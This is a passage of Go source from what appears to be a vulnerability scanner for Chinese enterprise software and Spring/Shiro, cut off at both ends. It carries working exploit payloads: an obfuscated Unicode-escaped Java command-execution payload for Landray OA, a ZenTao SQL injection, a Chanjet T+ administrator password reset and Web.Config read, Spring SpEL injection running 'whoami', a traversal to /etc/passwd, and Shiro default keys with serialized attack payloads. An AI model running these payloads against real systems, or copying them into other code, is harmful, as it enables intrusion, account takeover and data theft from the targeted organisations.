20\u0066\u002e\u0067\u0065\u0074\u0028\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0073\u0070\u0020\u003d\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u0030\u005d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u0030\u005d\u0029\u003b\u0073\u0074\u0072\u0020\u003d\u0020\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u0029\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0048\u0065\u0061\u0064\u0065\u0072\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0022\u0043\u006d\u0064\u0022\u007d\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0021\u0073\u0074\u0072\u002e\u0069\u0073\u0045\u006d\u0070\u0074\u0079\u0028\u0029\u0029\u0020\u007b\u0020\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0053\u0074\u0061\u0074\u0075\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0032\u0030\u0030\u0029\u007d\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u0020\u0063\u006d\u0064\u0073\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0022\u002c\u0020\u0022\u002f\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u0020\u003a\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u0022\u002c\u0020\u0022\u002d\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u0022\u0047\u0042\u004b\u0022\u003a\u0022\u0055\u0054\u0046\u002d\u0038\u0022\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0074\u0065\u0078\u0074\u0032\u0020\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u0053\u0063\u0061\u006e\u006e\u0065\u0072\u0028\u0028\u006e\u0065\u0077\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u0029\u002e\u0075\u0073\u0065\u0044\u0065\u006c\u0069\u006d\u0069\u0074\u0065\u0072\u0028\u0022\u005c\u005c\u0041\u0022\u0029\u002e\u006e\u0065\u0078\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0072\u0065\u0073\u0075\u006c\u0074\u003d\u0028\u0022\u0045\u0078\u0065\u0063\u0075\u0074\u0065\u003a\u0020\u0020\u0020\u0020\u0022\u002b\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0074\u0065\u0078\u0074\u0032\u002c\u0022\u0075\u0074\u0066\u002d\u0038\u0022\u0029\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0074\u006f\u006d\u0063\u0061\u0074\u002e\u0075\u0074\u0069\u006c\u002e\u0062\u0075\u0066\u002e\u0042\u0079\u0074\u0065\u0043\u0068\u0075\u006e\u006b\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u003b\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006f\u0062\u006a\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0030\u0029\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u004d\u0065\u0074\u0068\u006f\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0076\u0061\u0072\u0035\u0029\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0061\u0076\u0061\u002e\u006e\u0069\u006f\u002e\u0042\u0079\u0074\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0077\u0072\u0061\u0070\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0063\u006c\u0073\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0074\u0072\u0075\u0065\u003b\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0020\u007d`
					vurl := aas.Url + "/data/sys-common/treexml.tmpl"
					request, err := http.NewRequest("POST", vurl, strings.NewReader(treexml_payload))
					if err != nil {
						continue
					}
					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					request.Header.Set("Cmd", chmd)
					request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0")
					response, err := client.Do(request)
					if err != nil {
						continue
					}
					defer response.Body.Close()
					bodyby, err := ioutil.ReadAll(response.Body)
					if err != nil {
						continue
					}
					bodys := string(bodyby)
					if strings.Contains(bodys, "uid=") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在蓝凌OA treexml.tmpl命令执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + vurl)
					}
					if strings.Contains(bodys, "卷的序列号") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在蓝凌OA treexml.tmpl命令执行漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞 URL 地址：" + vurl)
					}

				}

			}

			//禅道
			if strings.Contains(aas.Cms, "禅道") || strings.Contains(aas.Cms, "禅道 zentao") {
				post_payloads := []string{
					//禅道16.5 SQL注入(CNVD-2022-42853)
					"account=admin'+and+(select+extractvalue(1,concat(0x7e,(MD5(110)),0x7e)))#",
				}
				for _, payload := range post_payloads {
					vurl := aas.Url + "/zentao/user-login.html"
					request, err := http.NewRequest("POST", vurl, strings.NewReader(payload))
					if err != nil {
						continue
					}
					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0")
					response, err := client.Do(request)
					if err != nil {
						continue
					}
					defer response.Body.Close()
					bodyby, err := ioutil.ReadAll(response.Body)
					if err != nil {
						continue
					}
					bodys := string(bodyby)
					if strings.Contains(bodys, "5f93f983524def3dca464469") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在禅道16.5 SQL注入(CNVD-2022-42853)")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + vurl)
					}
				}
			}

			//畅捷通T
			if strings.Contains(aas.Cms, "畅捷通 T+") {
				post_payloads := []string{
					//畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞
					"{\"pwdNew\":\"46f94c8de14fb36680850768ff1b7f2a\"}",
				}
				for _, payload := range post_payloads {
					vurl := aas.Url + "/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
					request, err := http.NewRequest("POST", vurl, strings.NewReader(payload))
					if err != nil {
						continue
					}
					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0")
					response, err := client.Do(request)
					if err != nil {
						continue
					}
					defer response.Body.Close()
					bodyby, err := ioutil.ReadAll(response.Body)
					if err != nil {
						continue
					}
					bodys := string(bodyby)
					if strings.Contains(bodys, "true") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞.admin/123qwe")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + vurl)
					}
				}
				payloads := []string{
					//畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞
					"/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config",
				}
				for _, payload := range payloads {
					targeturl := aas.Url + payload
					resp, err := client.Get(targeturl)
					if err != nil {
						continue
					}
					defer resp.Body.Close()
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						continue
					}
					bodyStr := string(bodyBytes)
					if strings.Contains(bodyStr, "<configuration>") {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + targeturl)
					}

				}
			}
			//spring-boot
			if strings.Contains(aas.Cms, "spring-boot") {
				//spring 代码执行(CVE-2018-1273)
				resp, err := client.Get(aas.Url)
				if err != nil {
					continue
				}
				defer resp.Body.Close()
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					continue
				}
				bodyStr := string(bodyBytes)
				if strings.Contains(bodyStr, "status") {

					targeturl := aas.Url + "/users"
					//fmt.Println(targeturl)
					payload := `username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]`
					payload2 := `username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("aaaaaa")]`
					resp1, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(payload))
					if err != nil {
						continue
					}
					defer resp1.Body.Close()
					body1, err := ioutil.ReadAll(resp1.Body)
					if err != nil {
						continue
					}
					//fmt.Println(string(body1))

					resp2, err := client.Post(targeturl, "application/x-www-form-urlencoded", strings.NewReader(payload2))
					if err != nil {
						continue
					}
					defer resp2.Body.Close()
					body2, err := ioutil.ReadAll(resp2.Body)
					if err != nil {
						continue
					}
					if resp1.StatusCode == http.StatusInternalServerError && resp2.StatusCode == http.StatusInternalServerError &&
						regexp.MustCompile(`Invalid property`).MatchString(string(body1)) &&
						regexp.MustCompile(`A problem occurred`).MatchString(string(body2)) {
						color.RGBStyleFromString("237,55,36").Println("[+] 存在spring 代码执行(CVE-2018-1273)")
						color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + targeturl)
					}
					//Spring Cloud Config 目录穿越漏洞(CVE-2020-5410)
					payloads := []string{
						//Spring Cloud Config 目录穿越漏洞(CVE-2020-5410)
						"/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development",
					}
					for _, payload := range payloads {
						targeturl := aas.Url + payload
						resp, err := client.Get(targeturl)
						if err != nil {
							continue
						}
						defer resp.Body.Close()
						bodyBytes, err := ioutil.ReadAll(resp.Body)
						if err != nil {
							continue
						}
						bodyStr := string(bodyBytes)
						if strings.Contains(bodyStr, "root") {
							color.RGBStyleFromString("237,55,36").Println("[+] 存在Spring Cloud Config 目录穿越漏洞(CVE-2020-5410)")
							color.RGBStyleFromString("244,211,49").Println("[+] 漏洞url：" + targeturl)
						}

					}

				}

			}

			//Shiro
			if strings.Contains(aas.Cms, "Shiro") {
				payloads := map[string][]string{
					"kPH+bIxk5D2deZiIxcaaaA==": []string{
						"3vakOJDcITulYawMdd4UijbPyPpv8wZkOZ7Yt0wBjT4GCmUbx1yXymqb1BLnkvBmJlQ/AWSKtysv9yV4IwHA2sr41OgrkhFABXpf3OJd8xei5RUuTMJVEVklCQuZD/diciR0hSKqwlw0vJ40XU41Osv2wsVVIurD7FoGziYufa74Jbo1VW7oWtWVNyaRLVyA",
						"f0USSIbi3sbw8Bgn3R/19oDCc/XdB7W17+Fnq0sRSzZYB/WANIHzP6jKXcPkiy3FcZVGY86gSBXj1p9Nlv6b/+X0xf5fvpjtVsM86sZ1KEhjf+iBB2gRYuUoK2a2xGYjSLxYhgVfvPfARwMAT3iEykc67BcfzKSyWa9LlSBE85vv0qdFwIfA/uwCe5r2LF1GFuUSnJjqjNlPTH+yq1xTDo3Ua/mWzCLJ3W5JeJmV0+IV6dfVQ4wq6DHLrptq80JIU5N5YBmdKThNzCFT3Nc7P9gOreQ6VF+GIlAJdt04FhA1m3tDD/vXYTvkF1GQNKbnu9n+daiDNd+DVGyB8+IT8LngRhBbShI3M0hIt75vCU86GXS9L2VLRi2qU2eUmtU2LEZ+iE/yOx99dNettXKi1UZA4x/Nf4018+9pwhJ1QqZP3UhrFgiiPDYh6/ouYviz5Erua12aH4GP2jFJvPwIdEabFpH9WMiSkUKh5M2xtsHPHxZCN7eu5BNQ2US18LooMhVCEZHjZwJFYH229za5cmnKj0kgPcx6bhNsVdDPdtU=",
					},
					"a2VlcE9uR29pbmdBbmRGaQ==": []string{"Lymw7k38V0zgxSNE5jvOb8dugluAK6AEV+nTTDHhI3LP4O/HQLqCYwaPlM5URAVjVOqje36G53KsUGmVRLTkdffxq1Skk8x5SU/3RTQtEYvZSpcTFBmFVmnsN2tZnxtRVV6INEnz4NO3Lf6eD/aNO8fepJIAEVn23M0Y8ZxOU6H7jFech7QYQUUS5iI45xJs2OwjW1344YQVh/d4IRN0hAJoU8lx+d7gtTqIawvQ8BJ7Q5mH+l2VMP6HWzsqZhNVd6iyFTwWV2ty7ZSZA2OCClTfvPWi9DZSPOczx/WxjHNWJ7A9UT3QKvdfYM3u9uQE5z4us4aeX7BmmqHcRmJiPVezg/NqwG3sIy5DHGS6Ype12IJn6M9e4PwVsAY4fbScMUtxtIwLbSKFaUaYcx6WkXbD2w7kqFxdIeb8vaomw8UF8Riv0RCnZTBKFwpqQ6vobbaO5y2VZwVfiU4CXfunotEyP4dUVLBCzMfu7W8O/ioDgV5NvdkylnRCWiwsFpsjhHWpWRmknCMiAStWQj2Co+t5GXVvgOr3xQ/gxpYjkAY="},
					"3AvVhmFLUs0KTA3Kprsdag==": []string{"kw6Np9KkcpH3/JRL8wpNWB3gssOZa+tpIAiuZEmDPhmSra6Hui73fJhe3gLvo1BqTN16oaxwRbOGidAk5k9aJaqQCBGc9GLrLPI5ShlbZUt22pLjLCH1RUM68/hQTsRdqvRGWIjB1gFYFOHJVF2sCZdJ66qBQDyC/tAuXr8QQLCRjpYbc7U5Ojxmq8UFLVMZUA9jFfIrPvRqaVdak+T81ZpRZ/7KM8Da9TqhDNvQ6p+iDP3mMuk0SW04A3hfxb2n6P9DG7eoRfL4sak/07nW+r0ElA4F9Q69qBfYhlaWkyTviWSuA3S4CKrnkyus6LhkBAmNJ8g4ezoUHQ7rBqurVroWbX4gEBHcvVAafUKWGsU6PR+alySNZ1ocvdK2xy/QndK/OwJdFgwSGvEBj2tRhdyLydOaGFUlilWNU3tmfDm6qPdLO23oLb4yQhW2StqPVvQjBo6Id9Llh5X9JRJRWgu14G5F/0IMnpY5gnqJt5ddF6CSjWpUZkSdBgNtRoZ8IUnWEAtVj6WCuhDtXyy+PN4kp9INJXHvg5ZotswIXSE="},
					"bWljcm9zAAAAAAAAAAAAAA==": []string{"O+oNEf+CnPnwusgkAnp5bXUVlhG+MdZeYRGsH26+YDO3kIEbATE/TeYT8hjBEE67ugQ7SFQXn3FKjcHsejZYhd/IV0TzbdVoUu26ZgIJM4wT5EvM3nCW4PtUbzuTNd0rsk9Dr5jrRv8n7Xmcfi0V396quwQWUbDVgBRdwg9/giDNb39VcKV1KD0/JF6ZMJgmduHrL9h25ZUsf2gH4rREwwhNMcWVhSTT4eb+RFioQf8fE6xoFNqQyee53W0Nv3MYROu4+1f+fisgBMq9U7SYWW7UysrLDClEBgObcYWhfxcTcvjcIJZl+UpUI0NL/kbFv4Z7rZ7nwshW8ul/cH1An5qszZrY6zmpUkNTb9FaHboXv+SBrdcdF0dEuOwHA0IT6cZ5kAYqmHRewH4WitRr+SBy9GHdb4IyQD3TLW6daVT/QNys2HliwlBMZLEkoo60EmjA47lnPNI4d/BY5rZEqHpdIBplQwVAEqC69NyLgQ0AfPtuwLkVpMA+f3dJNi5DMYO4lelI6gXEB31REjYQgQV/ixjselOf+VmpJSfcPAQ="},
					"U3ByaW5nQmxhZGUAAAAAAA==": []string{"Q3gdz7MW638P5LW/DYZYtnyc8QdezeulZBCkhUS2xu4Ap0QYR7qnrpmcfjcWAjkkTsqpEKlrRYc7i0lfhLFo7m+yFfuZNdPX/7SFpvi0nwW4hVruD+/vLWwjNkV/SmaTjHXdtovYWh7lMxhO8owOyUO2u4ZOjNlCg/jCSmU8ccAnOAtwz3VLdb0pVPQ2CzE9K2uJHcaLN/W1P7eENRsy8xeZx8LKlU1rjM6B/YEtWX6BUce4H2T8+O3MdV1ZPMyj6TAWZ3VKvbuhxXWtUh9lEC9pzV64VnJO27hJ+Ph40xYR+mof+SXleP64dRtfcOYlORpjFP1MWLT4CbH44oiaHUlvJSBho55JZM528Yq1CBs4azHate+V1gOKW0XFimT8CC2mvhXEuJ09vvPJbPPcbYE7jcIQnqbc+ZcalxxrNAWtbnMpYYh/AzyZ4kSdvYJg+dJp6/fy9+TI2cxygLmCcreYSDESuU2i9FGbDCCoD2VtMUx7etmBHyW+3G0Rlzd6Q0dAlHJ45/69rqgMk0Fnyopo45cVE8HAFPXFOzae1Xk="},
					"fCq+/xW488hMTCD+cmJ3aQ==": []string{"GtPDQzm/bMq9HmIMjaMAA4R9CTRvWs8jZ90QNmLNrSnaUQXgZaW3nLSatwUyr3YYkGKJTmV4KGjyZzhbVAm9l+Xgid4P3uKBz58TjRuOcASodX/pKCdiRLU6dA+02VVOXtdIhHB7HP+9DlKVsBIOZ3y7h/XW9qFmW1J7nogYN3YzcaR7oOCARvRM/DcFriAUrwaoJrmvtFPf4QtNsktGx8ZFYYd/tn6xWNvZDh35CNJjGER9Ckgy1RUTTjktZoeb/d1SNIxK0IKizgTLPFYjVcBFNqX7o3qMTt6mEIu0zWEocpmvR9RqBsnyD/eYeL+k4ve9vYIO6dPmTIC00N5tqH5oY4Nq9EectMqz/7Orbw4CClnaxtZvE/AOHFc8m0yMfgqzt/E4OJ3IUb/0OljoAZ7BdMg3OHmPXkTV6dkF6nGOqi8Jv261t209ztiZelNlQIFT/K4UKWRHcGkhj/eN2B6pIgPyRSNv/iEf2PVA8iaiPRKkVcUjfHuhIPeCd1r5HyiFIppSgyohlEWcNOXitaPzI7WDXz9EYWDeU1vAJoY="},
					"ZUdsaGJuSmxibVI2ZHc9PQ==": []string{"o2B4t6KZhw/v1aEZ2AhCRMCd/45dcXY2WGM9V6pVG6rJzNxPgJcmRmt8o5ZCNua/nZFNNJXncZD6TsugO2e/UZBFPhZrGBLcxw9Pn+SQKgadmeMCk0ERI87jjvidGcLFd00Zoc4OxGcm56lH7hduxd5fwQVOmjciSo0RWJTgOLKJkYJKmYEomp+AkfTjRxqRUwC1xJNfi7EE3b05tERRaWNqz29WWkByyXccDrPTOxLslno332GPXjdTWXdOIvnckNBg02Caw9J70/GjODUE8iPYFQKoYwP5bc/Tz8m2OmttouErkCDODsRYaaUiAAAh9tpSGRDunkyllIEQhYdA4LcrDj+B36kkkBF9kT9ws1LikKGxdxpQqeFJ1qF3uNUjVIww8vkVBl3PIKOwfLwXYL9GIw5uxYKCdDMtXbaFhVexwuuC64VF/S+cCqw+wR3JaQPRXZwzvn+IZs9/GsyxLU4X18aQJ/9gDEouwv/mEGkPyrCB89MH4rFNKy90bHlGcRv6KNcJe6PkDtmDSkk6dRmCeLJz7HYy/MLwB8X3VOM="},
					"MTIzNDU2Nzg5MGFiY2RlZg==": []string{"0UQYaokZAOt4Yq1/FrbAG2otUpdxh51vYsLPYfbPbomJbelOlEWuNp9Pt35wEYeVmKDy2DCTORXtXyNocWqQZDQUKKtOzF41yOt9nEy5gcmVHA+PfWv6tpGwKH5ukTo1HKLPA4bEhhGXGTfg5D+pvgtRqa0v1qsgjaRPMyuReQTuvbNGi8LhXnOZygJfL6iXx05PIN91UtW1sqc8nL4toL5UbuPkAXDyiy5WnMMz6y5o0+dRK1SS6HlFhnJmAdewL9cbRlA+bRxt9JHzxYSSbrXwK9yaQNPJ+wf7wqeUINm3k/QWLGEiu7DCzMgRsMTNcWW1FRX343J8Ae5iaEK6OTKppqw4t8u8pTB+DaRhrenCxgtj4yVbauo020YNV3UC1091/eTLrm8FRmM312RdB98iCi14FfwyouKsKr7dCyBOScMkWx+JLXRjxx2lvoSpXctXhgSW2+zu8j/+zMP2frU85kPzysmp5EiQmoOiAmQxkO/ecjGrkM8LM7KpqAIJRyWu6T2s3yc1oCHf7nhcQTiFlh8iLpTYtydhZ9wBFek="},
					"bWluZS1hc3NldC1rZXk6QQ==": []string{"djxP3wPzPyifGD4c+42CVYdmslr18s0apUpjRaJzX/LXOi4EHI2DACdwtKufKh+GW8O3oFNrUJm1FamdjqIYdSWklLQQxu8fudoSt5eLEaPnTZ8KFuCCWwUvxZuVrVy6MtaPIgBJEXcA7ckFYk3bLX+M4AGSIjaeKNkqYh4h84F8MHAuH5Ey2dB/t/7z6HipHhjF6sAVW01tqMeGlYKwBozTMGKR0Ne+a8xNnv5BavQCdvzrKas6hxJa4YIMsZv68D1YhytF7stSEHb1Y1W6YM4j83BguRLiWbW5vzz2YZjUFqgLlh0SqDV90LwrLvRe8Gbcv/554zZ19O0ibC0WSQ+b1hr7rss/1rjtalbNe9XkSibn80+VDBz/QLwMVcyx3TJ3n8hB6y2v6lr3yJe/EXlf4R+2Er7/Fzfv2O7YoOd5WaLgYyNaYicBUvNF9NpnQ5BP+0x9Itp9U91MoKNA4pOYgGprCudPxTtcOi9Sb3hYXsWA9JbEq3sHUTVap2XqhrSTQNfoj43g1zrD1WOkZYvL0WBox7X6thJFYmz9tfc="},
